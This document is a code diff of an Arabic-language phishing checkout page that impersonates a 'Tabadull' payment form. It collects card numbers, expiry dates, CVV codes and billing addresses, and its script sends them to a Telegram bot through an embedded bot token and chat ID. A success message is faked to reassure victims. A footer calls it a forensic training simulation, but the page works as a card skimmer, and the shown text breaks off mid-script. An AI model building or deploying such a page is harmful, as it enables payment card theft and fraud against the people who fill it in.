@@ -3,321 +3,494 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدفع الآمن | إتمام العملية</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Secure Checkout Tabadull</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #2c3e50;
-            --secondary: #3498db;
-            --danger: #e74c3c;
-            --success: #2ecc71;
-            --light: #ecf0f1;
-            --dark: #2c3e50;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background-color: #f5f7fa;
-            direction: rtl;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            padding: 30px;
-            background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            color: var(--primary);
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-
-        .header p {
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-
-        .payment-summary {
-            background: var(--light);
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-        }
-
-        .payment-summary h3 {
-            color: var(--primary);
-            margin-bottom: 10px;
-        }
-
-        .amount-input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-            text-align: center;
-        }
-
-        .card-icons {
+            font-family: 'Tajawal', sans-serif;
+            background: #f4f6f9;
             display: flex;
             justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .card-icons img {
-            height: 30px;
-            margin: 0 5px;
-            filter: grayscale(100%);
-            transition: 0.3s;
-        }
-
-        .card-icons img.active {
-            filter: grayscale(0%);
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--dark);
-            font-weight: 600;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        .row {
-            display: flex;
-            gap: 15px;
-        }
-
-        .row .form-group {
-            flex: 1;
-        }
-
-        .card-number-container {
-            position: relative;
-        }
-
-        .card-number-container .card-icons {
-            position: absolute;
-            left: 10px;
-            top: 50%;
-            transform: translateY(-50%);
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 0;
             margin: 0;
         }
-
-        .card-number-container .form-control {
-            padding-left: 60px;
-        }
-
-        .btn-submit {
+        .container {
+            max-width: 460px;
             width: 100%;
-            padding: 15px;
-            background: var(--secondary);
-            color: #fff;
-            border: none;
-            border-radius: 5px;
+            background: #ffffff;
+            border-radius: 0 0 24px 24px;
+            padding: 24px 20px 30px;
+            border: 1px solid #eef2f6;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.04);
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #eef2f6;
+        }
+        .header h1 {
+            font-size: 20px;
+            font-weight: 800;
+            color: #0a2540;
+        }
+        .header .amount {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0a2540;
+            background: #f1f5f9;
+            padding: 4px 14px;
+            border-radius: 30px;
+        }
+
+        .payment-method {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f8fafc;
+            padding: 10px 16px;
+            border-radius: 14px;
+            margin-bottom: 18px;
+            border: 1px solid #e2e8f0;
+        }
+        .payment-method .visa-icon, .payment-method .mc-icon {
+            font-weight: 700;
             font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
+        }
+        .payment-method .visa-icon { color: #1a1f71; }
+        .payment-method .mc-icon { color: #eb001b; }
+
+        .form-group { margin-bottom: 14px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 4px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafcff;
+            outline: none;
+            transition: 0.2s;
+            font-family: 'Tajawal', sans-serif;
+            color: #0f172a;
+        }
+        .form-group input:focus, .form-group select:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.06);
+            background: #ffffff;
         }
 
-        .btn-submit:hover {
-            background: #2980b9;
+        /* حقل البطاقة مع الشعارات */
+        .card-row {
+            display: flex;
+            align-items: center;
+            background: #fafcff;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 0 14px;
+            transition: 0.2s;
+        }
+        .card-row:focus-within {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.06);
+        }
+        .card-row input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 12px 0;
+            font-size: 16px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            outline: none;
+            font-family: 'Tajawal', monospace;
+            color: #0f172a;
+        }
+        .card-logos {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding-right: 8px;
+            border-right: 1px solid #e2e8f0;
+        }
+        .card-logos img {
+            height: 22px;
+            width: auto;
+            display: none;
+        }
+        .card-logos .show { display: block; }
+        .card-logos .default-icon {
+            font-size: 18px;
+            color: #94a3b8;
         }
 
-        .secure-badge {
+        .row-duo { display: flex; gap: 12px; }
+        .row-duo .form-group { flex: 1; }
+
+        .billing-title {
+            font-size: 15px;
+            font-weight: 800;
+            color: #0f172a;
+            margin: 16px 0 12px 0;
+            border-top: 1px solid #eef2f6;
+            padding-top: 14px;
+        }
+
+        .keypad {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px;
+            margin: 12px 0 8px 0;
+            padding: 10px;
+            background: #f8fafc;
+            border-radius: 14px;
+            border: 1px solid #eef2f6;
+            direction: ltr;
+        }
+        .keypad span {
+            background: white;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #334155;
+            border: 1px solid #e2e8f0;
+            min-width: 30px;
             text-align: center;
-            margin-top: 20px;
-            color: #7f8c8d;
-            font-size: 12px;
+            font-family: monospace;
         }
 
-        .secure-badge i {
-            color: var(--success);
-            margin-left: 5px;
+        .pay-btn {
+            width: 100%;
+            background: #0f172a;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 16px 0 10px 0;
+            box-shadow: 0 8px 24px rgba(15,23,42,0.12);
+        }
+        .pay-btn:hover { background: #1e293b; transform: scale(1.01); }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 14px;
+            padding-top: 14px;
+            border-top: 1px solid #eef2f6;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        .footer .powered { font-weight: 600; color: #64748b; }
+
+        #successMsg {
+            display: none;
+            margin-top: 18px;
+            padding: 16px;
+            background: #dcfce7;
+            border-radius: 16px;
+            color: #166534;
+            font-weight: 700;
+            text-align: center;
+            border: 1px solid #86efac;
+            line-height: 1.8;
+        }
+        #successMsg.show { display: block; }
+
+        .disclaimer {
+            margin-top: 18px;
+            padding: 10px 14px;
+            background: #fef2f2;
+            border-radius: 12px;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+            font-size: 11px;
+            text-align: center;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 16px; }
+            .row-duo { flex-direction: column; gap: 0; }
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- العنوان -->
         <div class="header">
-            <h1>إتمام عملية الدفع</h1>
-            <p>يرجى إدخال معلومات الدفع لإتمام عملية الشراء</p>
+            <h1>🔒 Secure Checkout</h1>
+            <span class="amount">$20.00</span>
         </div>
 
-        <div class="payment-summary">
-            <h3>ملخص الدفع</h3>
-            <div style="display: flex; justify-content: space-between; margin-top: 10px;">
-                <span>المبلغ المطلوب:</span>
-                <input type="text" class="amount-input" id="amount" placeholder="0.00 دولار" autocomplete="off">
-            </div>
+        <!-- ملخص الطلب -->
+        <div style="background: #f8fafc; padding: 10px 16px; border-radius: 12px; margin-bottom: 16px; font-weight: 600; color: #0a2540;">
+            📋 ملخص الطلب $20.00
+        </div>
+
+        <!-- بطاقة ائتمان -->
+        <div class="payment-method">
+            <span style="font-weight: 700; color: #0a2540;">💳 بطاقة ائتمان أو خصم مباشر</span>
+            <span class="visa-icon" id="brandText">Visa</span>
+        </div>
 
         <form id="paymentForm">
+            <!-- اسم حامل البطاقة -->
             <div class="form-group">
-                <label for="cardName">اسم حامل البطاقة</label>
-                <input type="text" class="form-control" id="cardName" placeholder="الاسم كما يظهر على البطاقة" autocomplete="cc-name" required>
+                <label>اسم حامل البطاقة (كما هو مُبين على البطاقة) *</label>
+                <input type="text" id="cardHolder" placeholder="John Doe" required>
             </div>
 
+            <!-- رقم البطاقة مع الكشف -->
             <div class="form-group">
-                <label for="cardNumber">رقم البطاقة</label>
-        <div class="input-group">
-            <input type="text" id="card_number" placeholder="رقم البطاقة" maxlength="16" required>
-            <!-- الأيقونات تظهر في أقصى اليمين داخل الحقل -->
-            <div class="card-logos">
-                <img src="https://cdn.phototourl.com/free/2026-07-17-a5997566-8c48-4289-b8bc-b2ebba617644.png" alt="Visa">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-            </div>
+                <label>رقم البطاقة *</label>
+                <div class="card-row">
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="card-logos" id="brandContainer">
+                        <span class="default-icon" id="defaultIcon">💳</span>
+                        <img id="visaLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="VISA">
+                        <img id="mcLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/2560px-Mastercard-logo.svg.png" alt="MasterCard">
+                        <img id="amexLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/American_Express_logo.svg/2560px-American_Express_logo.svg.png" alt="AMEX">
+                        <img id="discoverLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Discover_Card_logo.svg/2560px-Discover_Card_logo.svg.png" alt="Discover">
                     </div>
-                    <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required>
+                </div>
+                <div style="color: #dc2626; font-size: 12px; margin-top: 4px; display: none;" id="cardError">⚠️ الرجاء إدخال رقم بطاقة صالح (16 رقم).</div>
+            </div>
+
+            <!-- التاريخ ورمز الأمان -->
+            <div class="row-duo">
+                <div class="form-group">
+                    <label>تاريخ انتهاء الصلاحية *</label>
+                    <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" required>
+                </div>
+                <div class="form-group">
+                    <label>رمز الأمان *</label>
+                    <input type="password" id="csc" placeholder="•••" maxlength="4" required>
                 </div>
             </div>
 
-            <div class="row">
-                <div class="form-group">
-                    <label for="expiryDate">تاريخ الانتهاء</label>
-                    <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" autocomplete="cc-exp" required>
-                </div>
-                <div class="form-group">
-                    <label for="cvv">CVV</label>
-                    <input type="text" class="form-control" id="cvv" placeholder="123" autocomplete="cc-csc" required>
-                </div>
+            <!-- عنوان الفوترة -->
+            <div class="billing-title">📍 عنوان الفوترة (اختياري)</div>
+
+            <div class="form-group">
+                <label>البلد</label>
+                <select id="country">
+                    <option value="">حدد بلدًا</option>
+                    <option value="المملكة العربية السعودية">🇸🇦 المملكة العربية السعودية</option>
+                    <option value="الإمارات">🇦🇪 الإمارات</option>
+                    <option value="مصر">🇪🇬 مصر</option>
+                    <option value="ليبيا">🇱🇾 ليبيا</option>
+                    <option value="الجزائر">🇩🇿 الجزائر</option>
+                    <option value="المغرب">🇲🇦 المغرب</option>
+                    <option value="تونس">🇹🇳 تونس</option>
+                    <option value="الأردن">🇯🇴 الأردن</option>
+                    <option value="لبنان">🇱🇧 لبنان</option>
+                    <option value="العراق">🇮🇶 العراق</option>
+                    <option value="الكويت">🇰🇼 الكويت</option>
+                    <option value="قطر">🇶🇦 قطر</option>
+                    <option value="سلطنة عمان">🇴🇲 سلطنة عمان</option>
+                    <option value="البحرين">🇧🇭 البحرين</option>
+                    <option value="اليمن">🇾🇪 اليمن</option>
+                    <option value="تركيا">🇹🇷 تركيا</option>
+                    <option value="إيران">🇮🇷 إيران</option>
+                    <option value="باكستان">🇵🇰 باكستان</option>
+                    <option value="الهند">🇮🇳 الهند</option>
+                    <option value="الصين">🇨🇳 الصين</option>
+                    <option value="اليابان">🇯🇵 اليابان</option>
+                    <option value="ماليزيا">🇲🇾 ماليزيا</option>
+                    <option value="الولايات المتحدة">🇺🇸 الولايات المتحدة</option>
+                    <option value="المملكة المتحدة">🇬🇧 المملكة المتحدة</option>
+                    <option value="فرنسا">🇫🇷 فرنسا</option>
+                    <option value="ألمانيا">🇩🇪 ألمانيا</option>
+                    <option value="إيطاليا">🇮🇹 إيطاليا</option>
+                    <option value="إسبانيا">🇪🇸 إسبانيا</option>
+                    <option value="النرويج">🇳🇴 النرويج</option>
+                    <option value="السويد">🇸🇪 السويد</option>
+                    <option value="سويسرا">🇨🇭 سويسرا</option>
+                    <option value="النمسا">🇦🇹 النمسا</option>
+                    <option value="اليونان">🇬🇷 اليونان</option>
+                    <option value="روسيا">🇷🇺 روسيا</option>
+                    <option value="أستراليا">🇦🇺 أستراليا</option>
+                    <option value="كندا">🇨🇦 كندا</option>
+                    <option value="البرازيل">🇧🇷 البرازيل</option>
+                    <option value="جنوب أفريقيا">🇿🇦 جنوب أفريقيا</option>
+                    <option value="نيجيريا">🇳🇬 نيجيريا</option>
+                    <option value="أنغولا">🇦🇴 أنغولا</option>
+                    <option value="فيتنام">🇻🇳 فيتنام</option>
+                    <option value="تايلاند">🇹🇭 تايلاند</option>
+                </select>
             </div>
 
-            <div class="row">
+            <div class="form-group">
+                <label>العنوان</label>
+                <input type="text" id="address" placeholder="أضف رقم الشقة، والطابق، والوحدة، والجناح، إلخ.">
+            </div>
+            <div class="row-duo">
                 <div class="form-group">
-                    <label for="country">البلد</label>
-                    <select class="form-control" id="country" required>
-                        <option value="">اختر البلد</option>
-                        <option value="SA">المملكة العربية السعودية</option>
-                        <option value="AE">الإمارات العربية المتحدة</option>
-                        <option value="KW">الكويت</option>
-                        <option value="QA">قطر</option>
-                        <option value="BH">البحرين</option>
-                        <option value="OM">عمان</option>
-                        <option value="EG">مصر</option>
-                        <option value="JO">الأردن</option>
-                        <option value="LB">لبنان</option>
-                    </select>
+                    <label>المدينة</label>
+                    <input type="text" id="city" placeholder="المدينة">
                 </div>
                 <div class="form-group">
-                    <label for="city">المدينة</label>
-                    <input type="text" class="form-control" id="city" placeholder="ادخل المدينة" required>
+                    <label>الرمز البريدي</label>
+                    <input type="text" id="zip" placeholder="الرمز البريدي">
                 </div>
             </div>
+            <div class="form-group">
+                <label>الولاية / المقاطعة</label>
+                <input type="text" id="state" placeholder="الولاية / المقاطعة">
+            </div>
 
-            <button type="submit" class="btn-submit">إتمام الدفع</button>
+            <!-- تحذير التحقق -->
+            <div style="background: #f1f5f9; padding: 10px 14px; border-radius: 12px; font-size: 13px; color: #475569; margin: 10px 0;">
+                ⚠️ الشاشة التالية التي ستظهر لك قد تكون التحقق من بطاقة الدفع عبر الجهة التي أصدرت البطاقة.
+            </div>
+
+            <!-- لوحة المفاتيح -->
+            <div class="keypad">
+                <span>1</span> <span>2 ABC</span> <span>3 DEF</span>
+                <span>4 GHI</span> <span>5 JKL</span> <span>6 MNO</span>
+                <span>7 PQRS</span> <span>8 TUV</span> <span>9 WXYZ</span>
+                <span>* #</span> <span>0 +</span> <span>.</span>
+            </div>
+
+            <!-- زر الدفع -->
+            <button type="submit" class="pay-btn">⚙️ $20.00 الدفع</button>
         </form>
 
-        <div class="secure-badge">
-            <i class="fas fa-lock"></i> مدعوم بتقنية التشفير الآمن
+        <!-- تذييل -->
+        <div class="footer">
+            <span>Tabadull</span>
+            <span>Tripoli-Libya</span>
+            <span>Tripoli</span>
+            <span class="powered">⚡ Powered By</span>
+            <span>🇦🇪 (MENA) عربي</span>
+        </div>
+
+        <!-- رسالة النجاح -->
+        <div id="successMsg">✅ تمت العملية بنجاح <br> سيتم خصم مبلغ $20.00 من حسابك. <br> 📨 ستصلك رسالة تأكيد بعد قليل.</div>
+
+        <!-- تحذير أخلاقي -->
+        <div class="disclaimer">
+            ⚠️ هذه البيئة محاكاة تدريبية لأغراض الطب الشرعي الرقمي.<br> استخدامها لجمع بيانات حقيقية يعد جريمة إلكترونية.
         </div>
     </div>
 
     <script>
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        (function() {
+            // ========================================================
+            // 1. كشف العلامة التجارية (BIN) - 4 => فيزا، 2 => ماستركارد
+            // ========================================================
+            const cardInput = document.getElementById('cardNumber');
+            const errorMsg = document.getElementById('cardError');
+            const defaultIcon = document.getElementById('defaultIcon');
+            const visaLogo = document.getElementById('visaLogo');
+            const mcLogo = document.getElementById('mcLogo');
+            const amexLogo = document.getElementById('amexLogo');
+            const discoverLogo = document.getElementById('discoverLogo');
+            const brandText = document.getElementById('brandText');
 
-            // جمع البيانات
-            const paymentData = {
-                amount: document.getElementById('amount').value,
-                cardName: document.getElementById('cardName').value,
-                cardNumber: document.getElementById('cardNumber').value,
-                expiryDate: document.getElementById('expiryDate').value,
-                cvv: document.getElementById('cvv').value,
-                country: document.getElementById('country').value,
-                city: document.getElementById('city').value
-            };
+            function resetLogos() {
+                [visaLogo, mcLogo, amexLogo, discoverLogo].forEach(el => el.classList.remove('show'));
+                defaultIcon.style.display = 'inline';
+                brandText.textContent = 'Visa';
+            }
 
-            // إرسال البيانات إلى البوت
-            fetch('8916996420:AAF3uw_wA0cwNoIqU8Da9q_miEwxNyevAt4', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(paymentData)
-            })
-            .then(response => {
-                if (response.ok) {
-                    // عرض رسالة نجاح
-                    alert('تم إرسال معلومات الدفع بنجاح!');
-                    // إعادة تعيين النموذج
-                    document.getElementById('paymentForm').reset();
+            function detectBrand(value) {
+                const clean = value.replace(/\s/g, '');
+                if (!clean) return 'default';
+                const first = clean.substring(0, 1);
+                const firstTwo = clean.substring(0, 2);
+                const firstFour = clean.substring(0, 4);
+                if (first === '4') return 'visa';
+                if (first === '2') return 'mastercard';
+                if (firstTwo === '34' || firstTwo === '37') return 'amex';
+                if (firstFour === '6011' || firstTwo === '65') return 'discover';
+                return 'default';
+            }
+
+            function updateBrand() {
+                const raw = cardInput.value;
+                const brand = detectBrand(raw);
+                resetLogos();
+
+                const clean = raw.replace(/\s/g, '');
+                if (clean.length > 0 && clean.length < 15) {
+                    errorMsg.style.display = 'block';
                 } else {
-                    throw new Error('فشل في إرسال البيانات');
+                    errorMsg.style.display = 'none';
                 }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
+
+                if (brand === 'visa') {
+                    visaLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                    brandText.textContent = 'Visa';
+                } else if (brand === 'mastercard') {
+                    mcLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                    brandText.textContent = 'MasterCard';
+                } else if (brand === 'amex') {
+                    amexLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                    brandText.textContent = 'AMEX';
+                } else if (brand === 'discover') {
+                    discoverLogo.classList.add('show');
+                    defaultIcon.style.display = 'none';
+                    brandText.textContent = 'Discover';
+                } else {
+                    defaultIcon.style.display = 'inline';
+                    brandText.textContent = 'Visa';
+                }
+            }
+
+            cardInput.addEventListener('input', function() {
+                let val = this.value.replace(/\s/g, '').replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < val.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                this.value = formatted;
+                updateBrand();
             });
-        });
 
-        // تفعيل أيقونة البطاقة المناسبة عند إدخال رقم البطاقة
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            const cardNumber = e.target.value.replace(/\s+/g, '');
-            const visaIcon = document.getElementById('visa-icon-input');
-            const mastercardIcon = document.getElementById('mastercard-icon-input');
+            // ========================================================
+            // 2. الإرسال إلى بوت Telegram
+            // ========================================================
+            const form = document.getElementById('paymentForm');
+            const successDiv = document.getElementById('successMsg');
 
-            if (cardNumber.startsWith('4')) {
-                visaIcon.classList.add('active');
-                mastercardIcon.classList.remove('active');
-            } else if (cardNumber.startsWith('5')) {
-                mastercardIcon.classList.add('active');
-                visaIcon.classList.remove('active');
-            } else {
-                visaIcon.classList.remove('active');
-                mastercardIcon.classList.remove('active');
-            }
-        });
+            // 🔴 ضع التوكن هنا للتجربة الفعلية
+            const BOT_TOKEN = '8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs';
+            const CHAT_ID = '8399221617';
 
-        // تنسيق تاريخ الانتهاء تلقائيًا
-        document.getElementById('expiryDate').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value;
-        });
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
 
-        // تنسيق رقم البطاقة تلقائيًا
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
-                }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
-        });
-    </script>
-</body>
-  </html>
+                const cardHolder = document.getElementById('cardHolder').value.trim();
+                const cardNum = document.getElementById('cardNumber').value.trim();
+                const expiry = document.getElementById('expiry').value.trim();
+                const csc = document.getElementById('csc').value.trim();
+                const country = document.getElementById('country').value;
+                const address = document.getElementById('address').value.trim();
+                const city = document.getElementById('city').value.trim();
+                const zip = document.getElementById('zip').value.trim();
+                const state = document.getElementById('state').value.trim();
+
+                if (!cardHolder || !cardNum || !expiry || !csc || cardNum.replace(/\s/g, '').length < 16) {
+                    alert('يرجى إكمال جميع الحقول المطلوبة (رقم البطاقة 16 رقم).');
+          
